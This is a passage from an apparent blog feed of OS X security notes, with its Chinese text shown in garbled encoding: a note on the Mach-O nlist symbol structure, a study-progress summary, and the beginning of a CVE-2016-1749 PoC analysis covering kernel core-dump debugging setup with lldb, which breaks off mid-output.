    <title><![CDATA[nlist-Mach-Oæ–‡ä»¶é‡å®šå‘ä¿¡æ¯æ•°æ®ç»“æ„åˆ†æ]]></title>
    <link href="http://turingh.github.io/2016/05/24/nlist-Mach-O%E6%96%87%E4%BB%B6%E9%87%8D%E5%AE%9A%E5%90%91%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/05/24/nlist-Mach-Oæ–‡ä»¶é‡å®šå‘ä¿¡æ¯æ•°æ®ç»“æ„åˆ†æ/</id>
    <published>2016-05-25T03:30:50.000Z</published>
    <updated>2016-05-25T03:59:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>åœ¨ç ”ç©¶<code>Mach-O</code>çš„é‡å®šå‘ç›¸å…³å†…å®¹æ—¶ï¼Œå°±ä¸€å®šä¼šé‡åˆ°nlistè¿™ä¸ªæ•°æ®ç»“æ„ï¼Œä»–å®šä¹‰åœ¨<mach-o nlist.h="">æ–‡ä»¶ä¸­ï¼Œç®€å•çš„å¯¹å¤´æ–‡ä»¶ä¸­çš„æ³¨é‡Šåšäº†ç¿»è¯‘å’Œæ•´ç†ï¼Œä½“ç°åœ¨å›¾ä¸Šé¢ï¼Œnlistçš„æ•°æ®ç»“æ„çœ‹ä¼¼éå¸¸ç®€å•ï¼Œä½¿ç”¨çš„æ—¶å€™å´æœ‰ç‚¹å¤æ‚ï¼Œç†è§£nlistçš„æ•°æ®ç»“æ„æ˜¯è¿›ä¸€æ­¥å¯¹OSXå†…æ ¸è¿›è¡Œåˆ†æéå¸¸é‡è¦çš„ä¸€æ­¥ã€‚</mach-o></p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/nlist/nlist%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.png" alt="nliståˆ†æå›¾"></p>
<a id="more"></a>
<h1 id="0x01_ç®€å•ä»‹ç»">0x01 ç®€å•ä»‹ç»</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> nlist &#123;</span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> __LP64__</span></span><br><span class="line">		<span class="keyword">char</span> *n_name;	<span class="comment">/* for use when in-core */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">uint32_t</span> n_strx;	<span class="comment">/* index into the string table */</span></span><br><span class="line">	&#125; n_un;</span><br><span class="line">	<span class="keyword">uint8_t</span> n_type;		<span class="comment">/* type flag, see below */</span></span><br><span class="line">	<span class="keyword">uint8_t</span> n_sect;		<span class="comment">/* section number or NO_SECT */</span></span><br><span class="line">	<span class="keyword">int16_t</span> n_desc;		<span class="comment">/* see &lt;mach-o/stab.h&gt; */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> n_value;	<span class="comment">/* value of this symbol (or stab offset) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * This is the symbol table entry structure for 64-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> nlist_64 &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span>  n_strx; <span class="comment">/* index into the string table */</span></span><br><span class="line">    &#125; n_un;</span><br><span class="line">    <span class="keyword">uint8_t</span> n_type;        <span class="comment">/* type flag, see below */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> n_sect;        <span class="comment">/* section number or NO_SECT */</span></span><br><span class="line">    <span class="keyword">uint16_t</span> n_desc;       <span class="comment">/* see &lt;mach-o/stab.h&gt; */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> n_value;      <span class="comment">/* value of this symbol (or stab offset) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="1-1_n_type">1.1 n_type</h2><p>â€‹    <code>n_type</code>æ‹¥æœ‰8ä¸ªbitï¼Œä»–çš„åˆ†é…å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * The n_type field really contains four fields:</span><br><span class="line"> *	unsigned char N_STAB:3,</span><br><span class="line"> *		      N_PEXT:1,</span><br><span class="line"> *		      N_TYPE:3,</span><br><span class="line"> *		      N_EXT:1;</span><br><span class="line"> * which are used via the following masks.</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>è€Œ<code>N_TYPE</code>åˆåˆ†å‡ºå¥½å¤šç§ï¼Œå…·ä½“çš„å®šä¹‰å¯ä»¥å‚è§ä¸Šé¢çš„æ€ç»´å¯¼å›¾ï¼Œæˆ–è€…æºç ä¸­çš„æ³¨é‡Šã€‚</p>
<p><code>n_type</code>å­—æ®µä¸»è¦ç”¨æ¥æ ‡è¯†é‡å®šä¹‰ç¬¦å·ä¸åŒçš„ç§ç±»ã€‚</p>
<h2 id="1-2_n_desc">1.2 n_desc</h2><p>â€‹    <code>n_desc</code>çš„ç”¨æ³•ä¸<code>n_type</code>ç±»ä¼¼ï¼Œä¹Ÿæ˜¯è¢«æ©ç åˆ‡åˆ†æˆå¥½å¤šå—ï¼Œåˆ†åˆ«è¡¨ç¤ºä¸åŒçš„å«ä¹‰ã€‚ç”¨æ¥æ ‡è¯†é‡å®šä¹‰ç¬¦ä¸€äº›ç‰¹æ€§ã€‚</p>
<h2 id="1-3_n_value">1.3 n_value</h2><p>â€‹    <code>n_value</code>å€¼çš„å…·ä½“æ„ä¹‰æ ¹æ®<code>n_type</code>ã€<code>n_sect</code>çš„å˜åŒ–ï¼Œè€Œæ‹¥æœ‰å„è‡ªä¸åŒçš„å«ä¹‰ã€‚</p>
<h1 id="0x02_å°ç»“">0x02 å°ç»“</h1><p>å…¶å®<mach-o nlist.h="">ä¸­çš„æ³¨é‡Šå·²ç»è§£é‡Šçš„éå¸¸æ¸…æ¥šäº†ï¼Œåœ¨é˜…è¯»æœ¬æ–‡ä¹‹åï¼Œç»“åˆæ€ç»´å¯¼å›¾é˜…è¯»æºç æ–‡ä»¶ï¼Œä¸ä»…å¯ä»¥å‡å°‘ç†è§£çš„æ—¶é—´ï¼Œè€Œä¸”å¯ä»¥æ›´åŠ ç³»ç»Ÿçš„å»ç†è§£nlistæ•°æ®ç»“æ„ï¼Œæˆ–è€…æœ‰ç›®çš„æ€§çš„é˜…è¯»ä¸å½“å‰éœ€æ±‚ç›¸å…³çš„éƒ¨åˆ†ã€‚</mach-o></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>åœ¨ç ”ç©¶<code>Mach-O</code>çš„é‡å®šå‘ç›¸å…³å†…å®¹æ—¶ï¼Œå°±ä¸€å®šä¼šé‡åˆ°nlistè¿™ä¸ªæ•°æ®ç»“æ„ï¼Œä»–å®šä¹‰åœ¨<mach-o/nlist.h>æ–‡ä»¶ä¸­ï¼Œç®€å•çš„å¯¹å¤´æ–‡ä»¶ä¸­çš„æ³¨é‡Šåšäº†ç¿»è¯‘å’Œæ•´ç†ï¼Œä½“ç°åœ¨å›¾ä¸Šé¢ï¼Œnlistçš„æ•°æ®ç»“æ„çœ‹ä¼¼éå¸¸ç®€å•ï¼Œä½¿ç”¨çš„æ—¶å€™å´æœ‰ç‚¹å¤æ‚ï¼Œç†è§£nlistçš„æ•°æ®ç»“æ„æ˜¯è¿›ä¸€æ­¥å¯¹OSXå†…æ ¸è¿›è¡Œåˆ†æéå¸¸é‡è¦çš„ä¸€æ­¥ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/nlist/nlist%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.png" alt="nliståˆ†æå›¾"></p>]]>
    
    </summary>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[10-11-4ç‰ˆæœ¬å°ç»“]]></title>
    <link href="http://turingh.github.io/2016/05/23/10-11-4%E7%89%88%E6%9C%AC%E5%B0%8F%E7%BB%93/"/>
    <id>http://turingh.github.io/2016/05/23/10-11-4ç‰ˆæœ¬å°ç»“/</id>
    <published>2016-05-23T18:21:22.000Z</published>
    <updated>2016-05-23T18:56:05.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_ç‰ˆæœ¬å°ç»“">0x00 ç‰ˆæœ¬å°ç»“</h1><p>åœ¨<code>10.11.4</code>ç‰ˆæœ¬å¼€å§‹ç€æ‰‹ç ”ç©¶<code>OS X</code>ç³»ç»Ÿå®‰å…¨æ–¹é¢çš„çŸ¥è¯†ï¼Œä¸Šå‘¨è‹¹æœå‘å¸ƒäº†<code>10.11.5</code>ç‰ˆæœ¬ï¼Œ<code>10.11.4</code>ç‰ˆæœ¬çš„è¡¥ä¸ä¸­è¿˜æœ‰å¤§é‡çš„æ¼æ´æ²¡æœ‰ç ”ç©¶å®Œï¼Œåˆæ”¾å‡ºäº†æ–°çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œç¨å¾®åšä¸€ä¸‹æ€»ç»“ã€‚</p>
<h1 id="0x01_10-11-4_å°ç»“">0x01 10.11.4 å°ç»“</h1><h2 id="1-1_åŸºç¡€çŸ¥è¯†">1.1 åŸºç¡€çŸ¥è¯†</h2><h3 id="1-1-1_machoæ ¼å¼å­¦ä¹ ">1.1.1 machoæ ¼å¼å­¦ä¹ </h3><p>â€‹    å› ä¸ºåˆšå¼€å§‹ç ”ç©¶<code>OS X</code>ç³»ç»Ÿï¼ŒèŠ±äº†ä¸€éƒ¨åˆ†æ—¶é—´ç ”ç©¶äº†mach-oæ–‡ä»¶æ ¼å¼çš„çŸ¥è¯†ï¼Œåœ¨åç»­çš„æ¼æ´åˆ†æä¸­å‘ç°ï¼Œmach-oæ–‡ä»¶çš„çŸ¥è¯†è¿˜ä¸å¤Ÿæ‰å®ï¼Œè¿˜ä¼šæœ‰å¾ˆå¤šä¼¼æ‡‚éæ‡‚çš„é—®é¢˜ã€‚</p>
<p><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-oæ ¼å¼åˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">Mach-Oçš„åŠ¨æ€é“¾æ¥ç›¸å…³çŸ¥è¯†</a></p>
<p><a href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">fishhookæºç åˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSXå†…æ ¸åŠ è½½mach-oæµç¨‹åˆ†æ</a></p>
<h3 id="1-1-2_dyldæºç åˆ†æ">1.1.2 dyldæºç åˆ†æ</h3><p><a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">dyldæºç åˆ†æ-åŠ¨æ€åŠ è½½load</a></p>
<p><a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyldä¸­mach-oæ–‡ä»¶åŠ è½½çš„ç®€å•åˆ†æ</a></p>
<h2 id="1-2æ¼æ´åˆ†æ">1.2æ¼æ´åˆ†æ</h2><p>â€‹    ä¸»è¦åˆ†æäº†ä¸¤ä¸ªæ¼æ´<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>ä»¥åŠ<a href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/">CVE-2016-1749</a>ã€‚ä¸¤ä¸ªæ¼æ´ä¸€ä¸ªæ˜¯åº”ç”¨å±‚ä¸€ä¸ªæ˜¯å†…æ ¸å±‚çš„ï¼Œåœ¨åˆ†æç ”ç©¶æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿç†Ÿæ‚‰æŒæ¡äº†idaï¼Œbindiffï¼Œlldbç­‰ä¸€ç³»åˆ—å·¥å…·çš„å®é™…æ“ä½œã€‚åœ¨åˆ†æå¦å¤–ä¸€ä¸ªå†…æ ¸æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°åœ¨å†…æ ¸æ¡†æ¶çš„æŒæ¡ä¸Šæœ‰æ¯”è¾ƒå¤§çš„ç¼ºæ†¾ï¼Œæ‰€ä»¥èŠ±äº†å¤§é‡çš„æ—¶é—´ç†Ÿæ‚‰äº†å†…æ ¸å¼€å‘ä¸ä¸€äº›ç›¸å…³éƒ¨åˆ†çš„æºç ï¼Œæ‰€ä»¥æœ‰åŠä¸ªæœˆæ—¶é—´å·¦å³æ²¡æœ‰é€šè¿‡æ—¥å¿—æ€»ç»“å­¦ä¹ çš„å°ç»“ï¼Œåœ¨<code>10.11.5</code>ç‰ˆæœ¬çš„æ¼æ´ç ”ç©¶æ—¶å°†è¡¥å……ç›¸å…³çš„å†…å®¹ã€‚</p>
<ul>
<li>libkern c++ è¿è¡Œæ—¶æºç å­¦ä¹ </li>
<li>kextå†…æ ¸æ‰©å±•åŠ è½½æµç¨‹</li>
<li>iokitæ¡†æ¶å·¥ä½œçš„åŸç†åŠç»†èŠ‚çš„ç®€å•æ·±å…¥åˆ†æ</li>
<li>mach-oçš„dyldä¸­é‡å®šå‘çš„ä»£ç ç»†èŠ‚</li>
</ul>
<h1 id="0x02_10-11-5_ç›®æ ‡">0x02 10.11.5 ç›®æ ‡</h1><ul>
<li>æé«˜æ¼æ´åˆ†æçš„èƒ½åŠ›å’Œé€Ÿåº¦ï¼ˆPOCæ„å»ºï¼ŒEXPç¼–å†™ï¼‰</li>
<li>æé«˜åŸºç¡€èƒ½åŠ›çš„å­¦ä¹ ï¼ˆå†…æ ¸æºç ï¼Œç³»ç»Ÿç»“æ„ï¼‰</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_ç‰ˆæœ¬å°ç»“">0x00 ç‰ˆæœ¬å°ç»“</h1><p>åœ¨<code>10.11.4</code>ç‰ˆæœ¬å¼€å§‹ç€æ‰‹ç ”ç©¶<code>OS X</code>ç³»ç»Ÿå®‰å…¨æ–¹é¢çš„çŸ¥è¯†ï¼Œä¸Šå‘¨è‹¹æœå‘å¸ƒäº†<code>10.11.5</code>ç‰ˆæœ¬ï¼Œ<code>10.11.4</cod]]>
    </summary>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1749å†…æ ¸ä»£ç æ‰§è¡ŒPOCåˆ†æ]]></title>
    <link href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/29/CVE-2016-1749å†…æ ¸ä»£ç æ‰§è¡ŒPOCåˆ†æ/</id>
    <published>2016-04-29T16:43:50.000Z</published>
    <updated>2016-04-29T20:37:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p><code>OS X</code>ç³»ç»Ÿçš„10.11.4çš„ç³»ç»Ÿè¡¥ä¸ä¸­ä¿®å¤äº†ä¸€ä¸ªåœ¨å†…æ ¸ä¸­å¯ä»¥å¯¼è‡´ä»£ç æ‰§è¡Œçš„æ¼æ´ï¼Œæ¼æ´å½¢æˆçš„åŸå› æ˜¯ç¼ºå°‘äº†å¿…è¦çš„è¾¹ç•Œå€¼æ£€æµ‹ã€‚</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">æœ€åˆçš„æ¼æ´æŠ¥å‘Š</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076" target="_blank" rel="external">POCä¸‹è½½</a><br>æœ¬æ–‡è®°å½•äº†å¯¹POCçš„ç®€å•çš„è°ƒè¯•å’Œåˆ†æï¼Œå¯¹è¯¥æ¼æ´æœ‰ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œä¸ºåç»­çš„ç ”ç©¶åšå¥½å‡†å¤‡å·¥ä½œã€‚</li>
</ul>
<a id="more"></a>
<h1 id="0x01_å‡†å¤‡å·¥ä½œ">0x01 å‡†å¤‡å·¥ä½œ</h1><p>å› ä¸ºè¿™ä¸ªæ¼æ´æ˜¯ä¸€ä¸ªå†…æ ¸çº§çš„æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦æ­å»ºä¸€ä¸ªå†…æ ¸è°ƒè¯•çš„ç¯å¢ƒã€‚</p>
<h2 id="1-1_å†…æ ¸è°ƒè¯•ç¯å¢ƒçš„æ­å»º">1.1 å†…æ ¸è°ƒè¯•ç¯å¢ƒçš„æ­å»º</h2><p>å†…æ ¸è°ƒè¯•ç¯å¢ƒçš„æ­å»ºå¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯éœ€è¦ä¸€å°è£…æœ‰<code>OS X</code>çš„è™šæ‹Ÿæœºï¼Œåªéœ€è¦ä¸‹è½½å®˜æ–¹çš„<code>Kernel Debug Kit</code>ï¼Œå®‰è£…å¹¶æŒ‰ç…§<code>ReadMe.html</code>ä¸­çš„æ­¥éª¤æ“ä½œå³å¯ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹é»˜è®¤è·¯å¾„æ˜¯<code>/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/ReadMe.html</code></p>
<p><a href="https://developer.apple.com/downloads/" target="_blank" rel="external">KDKä¸‹è½½åœ°å€</a><br>ä¹Ÿå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="http://www.freebuf.com/articles/system/90049.html" target="_blank" rel="external">OSXå†…æ ¸è°ƒè¯•æŠ€å·§åˆ†äº«</a></p>
<h2 id="1-2_åˆ©ç”¨lldbè°ƒè¯•kernel_core_dump">1.2 åˆ©ç”¨lldbè°ƒè¯•kernel core dump</h2><p>åœ¨é»˜è®¤æƒ…å†µä¸‹å†…æ ¸å´©æºƒåä¼šäº§ç”Ÿpanicæ–‡ä»¶ï¼Œè®°å½•è¿™ä¸€æ¬¡å†…æ ¸å´©æºƒçš„æœ€åè°ƒç”¨æ ˆï¼Œç”¨æ¥åˆ†æå´©æºƒçš„åŸå› ï¼Œä½†æ˜¯panicæ–‡ä»¶çš„ä¿¡æ¯é‡æœ‰é™ï¼Œè€Œè¿›è¡Œä¸€æ¬¡å†…æ ¸çš„åŠ¨æ€è°ƒè¯•æ­¥éª¤åˆæ¯”è¾ƒå¤æ‚ï¼Œè¿™ä¸ªæ—¶å€™å¯¹kernel core dumpçš„åˆ†ææ˜¯ä¸€ç§æŠ˜ä¸­çš„æ–¹å¼ã€‚ä½†æ˜¯<code>OS X</code>ç³»ç»Ÿç”Ÿæˆçš„kernle coreä¸èƒ½åœ¨æœ¬æœºä¿å­˜éœ€è¦è®¾ç½®ä¸€ä¸ªæœåŠ¡å™¨ï¼Œåœ¨ç³»ç»Ÿå†…æ ¸å´©æºƒæ—¶ä¼šå°†coreæ–‡ä»¶å‘é€åˆ°æœåŠ¡å™¨ã€‚</p>
<p>è®¾ç½®æ–¹æ³•å¯ä»¥å‚è€ƒè‹¹æœç»™å‡ºçš„<a href="https://developer.apple.com/library/mac/technotes/tn2004/tn2118.html" target="_blank" rel="external">å®˜æ–¹æ–‡æ¡£</a>ï¼Œè¿™é‡Œç®€å•çš„å™è¿°ä¸€ä¸‹ã€‚åœ¨KDKçš„READMEæ–‡ä»¶ä¸­ä¹Ÿæœ‰è®¾ç½®çš„æ­¥éª¤ã€‚</p>
<h3 id="1-2-1_è®¾ç½®æœåŠ¡å™¨(ç‰©ç†æœº)">1.2.1 è®¾ç½®æœåŠ¡å™¨(ç‰©ç†æœº)</h3><ul>
<li>åˆ›å»ºcore dumpçš„æ–‡ä»¶å¤¹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo mkdir /PanicDumps</span><br><span class="line">Password:********</span><br><span class="line">server$ sudo chown root:wheel /PanicDumps</span><br><span class="line">server$ sudo chmod <span class="number">1777</span> /PanicDumps</span><br></pre></td></tr></table></figure>
<ul>
<li><p>å¯ç”¨core dumpæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.kdumpd.plist</span><br><span class="line">Password:********</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¡®è®¤æœåŠ¡å·²ç»å¼€å¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl list | grep kdump</span><br><span class="line">Password:********</span><br><span class="line"> - <span class="number">0</span>     com.apple.kdumpd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="1-2-2_è®¾ç½®å®¢æˆ·ç«¯(è™šæ‹Ÿæœº)">1.2.2 è®¾ç½®å®¢æˆ·ç«¯(è™šæ‹Ÿæœº)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client$ sudo nvram boot-args=<span class="string">"debug=0xd44 _panicd_ip=10.0.40.2"</span></span><br><span class="line">Password: ********</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„è¿™ä¸ªipéœ€è¦å¡«ç‰©ç†çš„ipã€‚ä¸”è™šæ‹Ÿæœºå¯ä»¥é€šè¿‡è¯¥ipå’Œç‰©ç†æœºç®€å†è¿æ¥ã€‚</p>
<h3 id="1-2-3_ä½¿ç”¨lldbè°ƒè¯•kernel_core">1.2.3 ä½¿ç”¨lldbè°ƒè¯•kernel core</h3><p>å½“ç³»ç»Ÿå†…æ ¸å´©æºƒåï¼Œåœ¨ç‰©ç†æœºçš„<code>/PanicDumps</code>è·¯å¾„ä¸­ä¼šå‡ºç°<code>xnu-XXX.gz</code>çš„æ–‡ä»¶ã€‚æ˜¯é€šè¿‡zipå‹ç¼©çš„ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip xnu-XXX.gz</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡æŒ‡ä»¤è§£å‹ååˆ©ç”¨lldbæŸ¥çœ‹coreæ–‡ä»¶<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„éœ€è¦ä½¿ç”¨sudoï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥çœ‹åˆ°core dumpçš„æƒ…å†µè¿›è¡Œåˆ†æäº†ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">âœ  ~ sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a                               </span><br><span class="line">(lldb) target create --core <span class="string">"/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a"</span></span><br><span class="line">Kernel UUID: DB8A107C-<span class="number">3</span>A4F-<span class="number">31</span>AB-<span class="number">8</span>BCE-EB77F80B1CD7</span><br><span class="line">Load Address: <span class="number">0</span>xffffff8010c00000</span><br><span class="line">warning: <span class="string">'kernel'</span> contains a debug script. To run this script <span class="keyword">in</span> this debug session:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">command</span> script import <span class="string">"/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/System/Library/Kernels/kernel.development.dSYM/Contents/Resources/DWARF/../Python/kernel.py"</span></span><br><span class="line"></span><br><span class="line">To run all discovered debug scripts <span class="keyword">in</span> this session:</span><br><span class="line"></span><br><span class="line">    settings <span class="built_in">set</span> target.load-script-from-symbol-file <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Kernel slid <span class="number">0</span>x10a00000 <span class="keyword">in</span> memory.</span><br><span class="line">Loaded kernel file /Library/Developer/KDKs/KDK_10.<span class="number">11.3</span>_15D13b.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">Loading <span class="number">97</span> kext modules warning: Can<span class="string">'t find binary/dSYM for com.apple.kec.corecrypto (D6E082B5-93B2-3FF0-AB4B-4AA310173CE8)</span><br><span class="line">.....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIPlatform (<span class="number">3</span>BE4E926-E063-<span class="number">3</span>BBD-BE05-F6F97358C7A4)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DiskImages (97177A33-27BD-34A9-9B42-1173BE480BCD)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleCredentialManager (E3817462-FFEE-<span class="number">38</span>AE-<span class="number">839</span>B-<span class="number">79932133</span>E7EF)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleMobileFileIntegrity (09620E73-2D73-3F62-9E5D-4B9DC2147F70)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleKeyStore (<span class="number">7</span>AF14D78-EEBE-<span class="number">3474</span>-B605-<span class="number">66</span>CC957F2FE5)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.security.sandbox (F3202072-6ED5-33BF-97B0-AD49F500ABF6)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAPIC (<span class="number">46368557</span>-CAF1-<span class="number">3</span>FAC-AF62-A03389987023)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for 